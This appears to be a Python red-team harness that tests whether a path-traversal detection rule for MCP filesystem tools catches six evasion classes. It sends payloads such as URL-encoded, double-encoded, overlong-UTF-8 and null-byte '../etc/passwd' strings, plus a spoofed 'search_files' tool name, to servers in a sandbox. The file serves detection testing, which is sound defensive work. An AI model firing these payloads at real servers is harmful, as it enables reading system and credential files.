#!/usr/bin/env python3
"""Phase 6 maturity pass -- adversarial evasion testing for SAF-T1105 /
rule 100108, bringing it to the same red-team standard the original three
techniques already have (data/evasion_corpus_v1.jsonl's E1-E12). Named as
a gap in docs/PHASE6-T1105-REPORT.md and detections/SAF-T1105_path_traversal/
detection.yaml's own known_gaps (fixtures.evasion_corpus was the explicit
"none" sentinel until this).

Deliberately NOT built on lab/attacks/path_traversal_harness.py (that generates
the canonical corpus; kept separate the same way lab/attacks/evasion_harness.py
is kept separate from lab/attacks/harness.py) -- self-contained, same
open_session()/call() shape, writes to a scratch path, never the canonical
telemetry.jsonl.

Each function below is one evasion class, each targeting a specific,
named mechanism already listed in SAF-T1105's own known_gaps or upstream's
README.md "Attack Vectors" section -- not invented here:

  E1 tool_name_spoof       -- names the traversal-performing tool one of
                              100108's own negate-excluded metadata/search
                              names (search_files). Same class E5 already
                              proved for 100103-100107 (docs/PHASE5-REPORT.md).
  E2 url_encoded           -- "%2e%2e%2f" instead of literal "../"
                              (upstream Attack Vector #3/"Common Vulnerable
                              Paths").
  E3 unicode_normalization -- "%c0%ae%c0%ae" overlong-UTF-8 encoding of ".."
                              (upstream Attack Vector #2).
  E4 double_encoded        -- "%252e%252e%252f" (upstream Attack Vector #3).
  E5 null_byte             -- "../../../etc/passwd%00" -- the literal ".."
                              IS present here, unlike E2-E4; this class
                              measures whether it's actually caught, per
                              known_gaps' own "unverified rather than
                              assumed covered" note (upstream Attack
                              Vector #4).
  E6 absolute_path_no_dots -- "/etc/passwd", no traversal sequence at all
                              -- structurally invisible to this rule by
                              construction, per known_gaps' own note.

Usage: python3 lab/attacks/path_traversal_evasion_harness.py --log-path <scratch path>
"""
import argparse
import asyncio
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

SERVERS = "lab/attacks/servers"
SANDBOX = "/app/sandbox"
SCENARIO = "path_traversal_evasion"


def open_session(server_command: list[str], log_path: str, task_id: str, *, env: dict | None = None):
    proxy_command = [
        "python3", "lab/proxy/proxy.py",
        "--log-path", log_path,
        "--label", "malicious",
        "--scenario-id", SCENARIO,
        "--task-id", task_id,
        "--",
    ] + server_command
    server_params = StdioServerParameters(command=proxy_command[0], args=proxy_command[1:], env=env)
    return stdio_client(server_params)


async def call(session: ClientSession, tool_name: str, arguments: dict) -> str:
    result = await session.call_tool(tool_name, arguments)
    parts = []
    for block in result.content:
        if getattr(block, "type", None) == "text":
            parts.append(block.text)
    return "\n".join(parts) if parts else ""


async def attack_evasion_e1_tool_name_spoof(log_path: str) -> None:
    print("[evasion] === E1 tool_name_spoof ===", file=sys.stderr)
    server_command = ["python3", f"{SERVERS}/traversal_read_server.py"]
    async with open_session(server_command, log_path, "attack_evasion_e1_toolname_spoof",
                             env={"TRAVERSAL_TOOL_NAME": "search_files"}) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            await session.list_tools()
            result = await call(session, "search_files", {"path": "../../../etc/passwd"})
            print(f"[evasion]   search_files('../../../etc/passwd') -> {result[:80]!r}", file=sys.stderr)


async def _real_fs_traversal(log_path: str, task_id: str, path: str) -> None:
    fs_command = ["npx", "-y", "@modelcontextprotocol/server-filesystem@2026.7.4", SANDBOX]
    async with open_session(fs_command, log_path, task_id) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            await session.list_tools()
            try:
                result = await call(session, "read_text_file", {"path": path})
                print(f"[evasion]   read_text_file({path!r}) -> {result[:80]!r}", file=sys.stderr)
            except Exception as e:
                print(f"[evasion]   read_text_file({path!r}) -> error (expected): {e}", file=sys.stderr)


async def attack_evasion_e2_url_encoded(log_path: str) -> None:
    print("[evasion] === E2 url_encoded ===", file=sys.stderr)
    await _real_fs_traversal(log_path, "attack_evasion_e2_url_encoded",
                              "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")


async def attack_evasion_e3_unicode_normalization(log_path: str) -> None:
    print("[evasion] === E3 unicode_normalization ===", file=sys.stderr)
    await _real_fs_traversal(log_path, "attack_evasion_e3_unicode_normalization",
                              "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd")


async def attack_evasion_e4_double_encoded(log_path: str) -> None:
    print("[evasion] === E4 double_encoded ===", file=sys.stderr)
    await _real_fs_traversal(log_path, "attack_evasion_e4_double_encoded",
                              "%252e%252e%252f%252e%252e%252fetc%252fpasswd")


async def attack_evasion_e5_null_byte(log_path: str) -> None:
    print("[evasion] === E5 null_byte ===", file=sys.stderr)
    await _real_fs_traversal(log_path, "attack_evasion_e5_null_byte",
                              "../../../etc/passwd%00")


async def attack_evasion_e6_absolute_path_no_dots(log_path: str) -> None:
    print("[evasion] === E6 absolute_path_no_dots ===", file=sys.stderr)
    await _real_fs_traversal(log_path, "attack_evasion_e6_absolute_path_no_dots",
                              "/etc/passwd")


ALL_EVASIONS = [
    attack_evasion_e1_tool_name_spoof,
    attack_evasion_e2_url_encoded,
    attack_evasion_e3_unicode_normalization,
    attack_evasion_e4_double_encoded,
    attack_evasion_e5_null_byte,
    attack_evasion_e6_absolute_path_no_dots,
]


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--log-path", required=True)
    args = parser.parse_args()
    for fn in ALL_EVASIONS:
        await fn(args.log_path)
    print("[evasion] path_traversal_evasion complete.", file=sys.stderr)


if __name__ == "__main__":
    asyncio.run(main())
